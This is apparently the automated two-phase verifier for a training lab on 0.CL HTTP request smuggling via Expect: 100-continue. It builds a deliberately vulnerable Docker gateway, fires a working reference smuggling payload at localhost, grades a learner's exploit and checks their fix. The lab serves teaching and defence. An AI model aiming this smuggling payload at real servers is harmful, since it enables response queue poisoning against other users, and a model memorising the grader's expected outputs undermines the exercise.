#!/usr/bin/env python3
"""Verifier otomatis 2 fase untuk Lab 10.

Rantai: 0.CL desync via Expect: 100-continue (ala James Kettle,
PortSwigger Research 2025; kasus T-Mobile $12.000, GitLab $7.000,
Akamai CVE-2025-32094 $9.000).

Gateway HTTP/1.1 meneruskan request ke backend lewat koneksi keep-alive.
Bug: untuk request dengan Expect: 100-continue, bila backend membalas
non-100 (early response dari gadget), gateway "lupa" body — request
dianggap berpanjang 0, dan byte body diparse sebagai request baru.
Backend menghormati Content-Length (menguras body), sehingga antrean
respons bergeser: respons untuk request selundupan sebenarnya adalah
respons untuk request berikutnya (response queue poisoning).

Hanya memakai Python stdlib (tanpa dependency), butuh `docker compose`
di host.

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - baseline GET /                        -> 200 "lab10: ok"
      - POST /echo (Content-Length, tanpa Expect) -> 200 echo
      - POST /echo + Expect: 100-continue     -> 100 lalu 200
      - POST /static/logo.png + Expect        -> 200 LANGSUNG (gadget,
        tanpa 100) — diferensial yang harus ditemukan learner
      - serangan referensi (health)           -> 0.CL: 3 request logis,
        2 respons; respons ke-2 berisi marker probe (bukan marker
        selundupan); respons ke-3 tidak pernah tiba (timeout)
      - exploit/exploit.py milik learner dijalankan -> mencetak
        STATUS: 200 + SMUGGLED_PATH: /path
  FASE 2 (dengan fix/): bangun ulang gateway dari fix/gateway, pastikan
      - serangan referensi GAGAL               -> 400 (Expect ditolak),
        koneksi ditutup
      - fungsi normal utuh                    -> GET /, POST /echo,
        GET /lain -> 200

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/gateway/gateway.py identik byte-per-byte dengan
    gateway/gateway.py (pristine) -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import filecmp
import os
import re
import shutil
import socket
import subprocess
import sys
import time

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
SMUGGLED_MARK = b"/0cl-ref-10"
PROBE_MARK = b"/0cl-probe-10"
PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " -- " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


class Conn:
    """Klien HTTP/1.1 mentah dengan buffer baca (mendukung pipelining)."""

    def __init__(self, timeout=10):
        self.s = socket.create_connection((HOST, PORT), timeout=timeout)
        self.buf = b""

    def send(self, data):
        self.s.sendall(data)

    def read_response(self, timeout=10):
        """Baca satu respons. -> (status, body) | (None, None) bila timeout/EOF."""
        self.s.settimeout(timeout)
        try:
            while b"\r\n\r\n" not in self.buf:
                chunk = self.s.recv(65536)
                if not chunk:
                    return None, None
                self.buf += chunk
                if len(self.buf) > 4 * 1024 * 1024:
                    return None, None
            idx = self.buf.find(b"\r\n\r\n")
            head = self.buf[:idx].decode("latin-1")
            status = int(head.split("\r\n", 1)[0].split(" ", 2)[1])
            cl = 0
            for ln in head.split("\r\n")[1:]:
                if ":" in ln:
                    k, v = ln.split(":", 1)
                    if k.strip().lower() == "content-length":
                        try:
                            cl = int(v.strip())
                        except ValueError:
                            cl = 0
            need = idx + 4 + cl
            while len(self.buf) < need:
                chunk = self.s.recv(65536)
                if not chunk:
                    break
                self.buf += chunk
            body = self.buf[idx + 4:need]
            self.buf = self.buf[need:]
            return status, body
        except (OSError, ValueError, IndexError):
            return None, None

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


def http_get(path):
    c = Conn()
    try:
        c.send(("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n"
                % (path, HOST)).encode("latin-1"))
        return c.read_response()
    finally:
        c.close()


def reference_attack(smuggled=SMUGGLED_MARK, probe=PROBE_MARK):
    """Serangan 0.CL referensi: POST gadget + Expect + CL, selundupkan
    satu request, lalu probe. Kembalikan (r1, r2, r3) dengan
    r = (status, body); r3 diharapkan (None, None) = timeout."""
    c = Conn(timeout=10)
    try:
        s = ("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n"
             % (smuggled.decode("latin-1"), HOST)).encode("latin-1")
        attack = ("POST /static/logo.png HTTP/1.1\r\n"
                  "Host: %s\r\n"
                  "Expect: 100-continue\r\n"
                  "Content-Length: %d\r\n"
                  "\r\n" % (HOST, len(s))).encode("latin-1")
        pr = ("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n"
              % (probe.decode("latin-1"), HOST)).encode("latin-1")
        c.send(attack + s + pr)
        r1 = c.read_response(timeout=10)
        r2 = c.read_response(timeout=10)
        r3 = c.read_response(timeout=5)
        return r1, r2, r3
    finally:
        c.close()


def is_vulnerable(r1, r2, r3):
    """Diferensial 0.CL: 3 request logis -> 2 respons; respons ke-2
    berisi marker probe (pergeseran antrean); tak ada respons ke-3."""
    if r1[0] != 200 or r2[0] != 200:
        return False
    if PROBE_MARK not in r2[1] or SMUGGLED_MARK in r2[1]:
        return False
    return r3 == (None, None)


def wait_up(timeout=150):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            st, body = http_get("/")
            if st == 200 and body == b"lab10: ok":
                return True
        except OSError:
            pass
        time.sleep(2)
    return False


def compose_down():
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])


def parse_exploit_output(out):
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_path = re.search(r"^SMUGGLED_PATH:\s*(\S+)\s*$", out, re.MULTILINE)
    return (m_status.group(1) if m_status else None,
            m_path.group(1) if m_path else None)


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    log("== bersih-bersih container lama ==")
    compose_down()

    # ---------------- FASE 1 ----------------
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, body = http_get("/")
    check("baseline GET / -> 200", st == 200 and body == b"lab10: ok",
          "dapat %s %r" % (st, body[:20] if body else body))

    c = Conn()
    try:
        c.send(("POST /echo HTTP/1.1\r\nHost: %s\r\nContent-Length: 5\r\n\r\n"
                % HOST).encode("latin-1") + b"hello")
        st, body = c.read_response()
    finally:
        c.close()
    check("fungsi normal: POST /echo -> 200 echo",
          st == 200 and body == b"lab10: echo:hello", "dapat %s" % st)

    c = Conn()
    try:
        c.send(("POST /echo HTTP/1.1\r\nHost: %s\r\nExpect: 100-continue\r\n"
                "Content-Length: 5\r\n\r\n" % HOST).encode("latin-1"))
        r100 = c.read_response(timeout=10)
        ok100 = r100[0] == 100
        if ok100:
            c.send(b"hello")
            st, body = c.read_response(timeout=10)
        else:
            st, body = None, None
    finally:
        c.close()
    check("fungsi normal: POST /echo + Expect -> 100 lalu 200",
          ok100 and st == 200, "dapat 100=%s lalu %s" % (ok100, st))

    c = Conn()
    try:
        c.send(("POST /static/logo.png HTTP/1.1\r\nHost: %s\r\n"
                "Expect: 100-continue\r\nContent-Length: 5\r\n\r\n"
                % HOST).encode("latin-1") + b"hello")
        st, _ = c.read_response(timeout=10)
    finally:
        c.close()
    check("gadget: POST /static/logo.png + Expect -> 200 langsung "
          "(tanpa 100)", st == 200, "dapat %s" % st)

    r1, r2, r3 = reference_attack()
    ok = is_vulnerable(r1, r2, r3)
    check("serangan referensi: 0.CL terkonfirmasi "
          "(3->2 respons, antrean bergeser)", ok,
          "dapat r1=%s r2=%s r3=%s" % (r1[0], r2[0], r3[0]))
    if not ok:
        log("LAB RUSAK: serangan referensi gagal di definisi pristine.")
        compose_down()
        sys.exit(1)

    log("== FASE 1: reset ke pristine segar untuk exploit learner ==")
    compose_down()
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    log("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    exp = os.path.join(LAB_DIR, "exploit", "exploit.py")
    try:
        p = subprocess.run([sys.executable, exp], capture_output=True,
                           text=True, timeout=60, cwd=os.path.dirname(exp))
    except subprocess.TimeoutExpired:
        log("exploit.py melebihi 60 detik.")
        compose_down()
        sys.exit(1)
    if "NotImplementedError" in (p.stderr or ""):
        log("exploit.py masih scaffold (NotImplementedError). Kerjakan fase 1 dulu.")
        compose_down()
        sys.exit(3)
    status, spath = parse_exploit_output(p.stdout or "")
    check("exploit mencetak STATUS: 200", status == "200",
          "dapat %r" % status)
    check("exploit mencetak SMUGGLED_PATH: /...", spath and spath.startswith("/"),
          "dapat %r" % spath)

    compose_down()

    # ---------------- FASE 2 ----------------
    log("== FASE 2: cek scaffold fix ==")
    pristine = os.path.join(LAB_DIR, "gateway", "gateway.py")
    fixed = os.path.join(LAB_DIR, "fix", "gateway", "gateway.py")
    if filecmp.cmp(pristine, fixed, shallow=False):
        log("fix/gateway/gateway.py masih identik dengan pristine. Kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    r1, r2, r3 = reference_attack()
    check("serangan referensi GAGAL: Expect -> 400", r1[0] == 400,
          "dapat r1=%s" % (r1[0],))
    st, body = http_get("/")
    check("fungsi normal: GET / -> 200", st == 200 and body == b"lab10: ok",
          "dapat %s" % st)
    c = Conn()
    try:
        c.send(("POST /echo HTTP/1.1\r\nHost: %s\r\nContent-Length: 5\r\n\r\n"
                % HOST).encode("latin-1") + b"hello")
        st, body = c.read_response()
    finally:
        c.close()
    check("fungsi normal: POST /echo -> 200", st == 200, "dapat %s" % st)
    st, _ = http_get("/lain")
    check("fungsi normal: GET /lain -> 200", st == 200, "dapat %s" % st)

    compose_down()

    failed = [n for (n, ok) in results if not ok]
    log("== HASIL: %d/%d cek lulus ==" % (len(results) - len(failed), len(results)))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
